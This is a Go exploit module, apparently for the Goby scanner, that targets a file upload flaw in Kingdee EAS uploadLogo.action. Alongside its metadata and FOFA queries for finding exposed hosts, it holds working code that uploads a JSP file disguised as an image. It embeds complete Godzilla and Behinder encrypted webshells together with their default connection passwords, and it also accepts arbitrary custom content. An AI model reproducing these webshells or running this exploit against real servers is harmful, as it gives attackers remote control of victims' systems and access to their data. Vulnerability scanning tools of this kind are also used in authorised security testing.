package exploits

import (
	"errors"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"regexp"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Kingdee EAS uploadLogo.action api file upload vulnerability",
    "Description": "<p>Kingdee EAS and EAS Cloud are an enterprise-level application software suite launched by Kingdee Software Company, aiming to help enterprises achieve comprehensive management and business process optimization.</p><p>Kingdee EAS and EAS Cloud have file upload vulnerabilities in uploadLogo.action. Attackers can use the file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.</p>",
    "Product": "Kingdee-EAS",
    "Homepage": "http://www.kingdee.com/",
    "DisclosureDate": "2023-06-05",
    "PostTime": "2023-10-11",
    "Author": "woo0nise@gmail.com",
    "FofaQuery": "body=\"easSessionId\" || header=\"easportal\" || header=\"eassso/login\" || banner=\"eassso/login\" || body=\"/eassso/common\" || (title=\"EAS系统登录\" && body=\"金蝶\") || header=\"EASSESSIONID\" || banner=\"EASSESSIONID\"",
    "GobyQuery": "body=\"easSessionId\" || header=\"easportal\" || header=\"eassso/login\" || banner=\"eassso/login\" || body=\"/eassso/common\" || (title=\"EAS系统登录\" && body=\"金蝶\") || header=\"EASSESSIONID\" || banner=\"EASSESSIONID\"",
    "Level": "3",
    "Impact": "<p>Kingdee EAS and EAS Cloud have file upload vulnerabilities in uploadLogo.action. Attackers can use the file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.</p>",
    "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://vip.kingdee.com/knowledge/specialDetail/164676138713728512?category=268743209985840384&amp;id=460728139602294272&amp;productLineId=8\">https://vip.kingdee.com/knowledge/specialDetail/164676138713728512?category=268743209985840384&amp;id=460728139602294272&amp;productLineId=8</a></p>",
    "References": [],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "webshell,custom",
            "show": ""
        },
        {
            "name": "webshell",
            "type": "select",
            "value": "behinder,godzilla",
            "show": "attackType=webshell"
        },
        {
            "name": "content",
            "type": "input",
            "value": "<% out.println(\"hello\");%>",
            "show": "attackType=custom"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "File Upload"
    ],
    "VulType": [
        "File Upload"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        "CNVD-2023-74148"
    ],
    "CVSSScore": "9.8",
    "Translation": {
        "CN": {
            "Name": "金蝶 EAS uploadLogo.action 接口文件上传漏洞",
            "Product": "Kingdee-EAS",
            "Description": "<p>金蝶 EAS 及 EAS Cloud 是金蝶软件公司推出的一套企业级应用软件套件，旨在帮助企业实现全面的管理和业务流程优化。</p><p>金蝶 EAS 及 EAS Cloud&nbsp; 在 uploadLogo.action 存在文件上传漏洞，攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。</p>",
            "Recommendation": "<p>厂商已发布了漏洞修复程序，请及时关注更新：<a href=\"https://vip.kingdee.com/knowledge/specialDetail/164676138713728512?category=268743209985840384&amp;id=460728139602294272&amp;productLineId=8\" target=\"_blank\">https://vip.kingdee.com/knowledge/specialDetail/164676138713728512?category=268743209985840384&amp;id=460728139602294272&amp;productLineId=8</a><br></p>",
            "Impact": "<p>金蝶 EAS 及 EAS Cloud&nbsp; 在 uploadLogo.action 存在文件上传漏洞，攻击者可以利用文件上传漏洞执行恶意代码、写入后门、读取敏感文件，从而可能导致服务器受到攻击并被控制。<br></p>",
            "VulType": [
                "文件上传"
            ],
            "Tags": [
                "文件上传"
            ]
        },
        "EN": {
            "Name": "Kingdee EAS uploadLogo.action api file upload vulnerability",
            "Product": "Kingdee-EAS",
            "Description": "<p>Kingdee EAS and EAS Cloud are an enterprise-level application software suite launched by Kingdee Software Company, aiming to help enterprises achieve comprehensive management and business process optimization.</p><p>Kingdee EAS and EAS Cloud have file upload vulnerabilities in uploadLogo.action. Attackers can use the file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.</p>",
            "Recommendation": "<p>The manufacturer has released a vulnerability fix, please pay attention to updates in time: <a href=\"https://vip.kingdee.com/knowledge/specialDetail/164676138713728512?category=268743209985840384&amp;id=460728139602294272&amp;productLineId=8\" target=\"_blank\">https://vip.kingdee.com/knowledge/specialDetail/164676138713728512?category=268743209985840384&amp;id=460728139602294272&amp;productLineId=8</a><br></p>",
            "Impact": "<p>Kingdee EAS and EAS Cloud have file upload vulnerabilities in uploadLogo.action. Attackers can use the file upload vulnerabilities to execute malicious code, write backdoors, and read sensitive files, which may cause the server to be attacked and controlled.<br></p>",
            "VulType": [
                "File Upload"
            ],
            "Tags": [
                "File Upload"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10845"
}`

	uploadFlagfSxKMKpY6 := func(hostInfo *httpclient.FixUrl, content string) (*httpclient.HttpResponse, error) {
		uploadRequestConfig := httpclient.NewPostRequestConfig(`/plt_portal/setting/uploadLogo.action`)
		uploadRequestConfig.FollowRedirect = false
		uploadRequestConfig.VerifyTls = false
		uploadRequestConfig.Header.Store(`Content-Type`, `multipart/form-data; boundary=----WebKitFormBoundarycxkT8bV6WLIUzm2p`)
		uploadRequestConfig.Data = "------WebKitFormBoundarycxkT8bV6WLIUzm2p\r\nContent-Disposition: form-data; name=\"chooseLanguage_top\"\r\n\r\nch\r\n------WebKitFormBoundarycxkT8bV6WLIUzm2p\r\nContent-Disposition: form-data; name=\"dataCenter\"\r\n\r\nxx\r\n------WebKitFormBoundarycxkT8bV6WLIUzm2p\r\nContent-Disposition: form-data; name=\"insId\"\r\n\r\n\r\n------WebKitFormBoundarycxkT8bV6WLIUzm2p\r\nContent-Disposition: form-data; name=\"type\"\r\n\r\ntop\r\n------WebKitFormBoundarycxkT8bV6WLIUzm2p\r\nContent-Disposition: form-data; name=\"upload\"; filename=\"text.jsp\"\r\nContent-Type: image/jpeg\r\n\r\n" + content + "\r\n------WebKitFormBoundarycxkT8bV6WLIUzm2p--\r\n"
		rsp, err := httpclient.DoHttpRequest(hostInfo, uploadRequestConfig)
		if err != nil {
			return nil, err
		} else if rsp.StatusCode != 200 && len(regexp.MustCompile(`(\d+).jsp`).FindStringSubmatch(string(rsp.Utf8Html))) < 1 {
			return nil, errors.New("漏洞利用失败")
		}
		filename := regexp.MustCompile(`(\d+).jsp`).FindStringSubmatch(string(rsp.Utf8Html))[0]
		checkRequestConfig := httpclient.NewGetRequestConfig(`/portal/res/file/upload/` + filename)
		checkRequestConfig.VerifyTls = false
		checkRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, checkRequestConfig)
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, hostInfo *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			checkStr := goutils.RandomHexString(16)
			resp, _ := uploadFlagfSxKMKpY6(hostInfo, `<% out.println(`+strconv.Quote(checkStr)+`);new java.io.File(application.getRealPath(request.getServletPath())).delete(); %>`)
			return resp != nil && strings.Contains(resp.Utf8Html, checkStr)
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			var content string
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			webshell := goutils.B2S(stepLogs.Params["webshell"])
			if attackType == "webshell" {
				if webshell == "godzilla" {
					content = `<%! String xc="3c6e0b8a9c15224a"; String pass="pass"; String md5=md5(pass+xc); class X extends ClassLoader{public X(ClassLoader z){super(z);}public Class Q(byte[] cb){return super.defineClass(cb, 0, cb.length);} }public byte[] x(byte[] s,boolean m){ try{javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));return c.doFinal(s); }catch (Exception e){return null; }} public static String md5(String s) {String ret = null;try {java.security.MessageDigest m;m = java.security.MessageDigest.getInstance("MD5");m.update(s.getBytes(), 0, s.length());ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();} catch (Exception e) {}return ret; } public static String base64Encode(byte[] bs) throws Exception {Class base64;String value = null;try {base64=Class.forName("java.util.Base64");Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Encoder"); Object Encoder = base64.newInstance(); value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) {}}return value; } public static byte[] base64Decode(String bs) throws Exception {Class base64;byte[] value = null;try {base64=Class.forName("java.util.Base64");Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e) {try { base64=Class.forName("sun.misc.BASE64Decoder"); Object decoder = base64.newInstance(); value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });} catch (Exception e2) {}}return value; }%><%try{byte[] data=base64Decode(request.getParameter(pass));data=x(data, false);if (session.getAttribute("payload")==null){session.setAttribute("payload",new X(this.getClass().getClassLoader()).Q(data));}else{request.setAttribute("parameters",data);java.io.ByteArrayOutputStream arrOut=new java.io.ByteArrayOutputStream();Object f=((Class)session.getAttribute("payload")).newInstance();f.equals(arrOut);f.equals(pageContext);response.getWriter().write(md5.substring(0,16));f.toString();response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));response.getWriter().write(md5.substring(16));} }catch (Exception e){} %>`
				} else if webshell == "behinder" {
					content = `<%@page import="java.util.*,javax.crypto.*,javax.crypto.spec.*"%><%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return super.defineClass(b,0,b.length);}}%><%if (request.getMethod().equals("POST")){String k="e45e329feb5d925b";/*该密钥为连接密码32位md5值的前16位，默认连接密码rebeyond*/session.putValue("u",k);Cipher c=Cipher.getInstance("AES");c.init(2,new SecretKeySpec(k.getBytes(),"AES"));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);}%>`
				}
			} else if attackType == "custom" {
				content = stepLogs.Params["content"].(string)
			} else {
				expResult.Output = "未知的利用方式"
				return expResult
			}
			resp, err := uploadFlagfSxKMKpY6(expResult.HostInfo, content)
			if err != nil {
				expResult.Output = err.Error()
			} else if resp.StatusCode == 200 || resp.StatusCode == 500 {
				expResult.Success = true
				if attackType == "custom" {
					expResult.Output = fmt.Sprintf("File URL: %s\n", expResult.HostInfo.FixedHostInfo+resp.Request.URL.Path)
					return expResult
				}
				expResult.Output = fmt.Sprintf("WebShell URL: %s\n", expResult.HostInfo.FixedHostInfo+resp.Request.URL.Path)
				if webshell == "behinder" {
					expResult.Output += "Password: rebeyond\n"
					expResult.Output += "WebShell tool: Behinder v3.0\n"
				} else if webshell == "godzilla" {
					expResult.Output += "Password: pass 加密器：JAVA_AES_BASE64\n"
					expResult.Output += "WebShell tool: Godzilla v4.0.1\n"
					expResult.Output += fmt.Sprintf("HTTPHeader: Referer: %s\n" , expResult.HostInfo.FixedHostInfo + resp.Request.URL.Path)
				}
				expResult.Output += "Webshell type: JSP"
			}
			return expResult
		},
	))
}
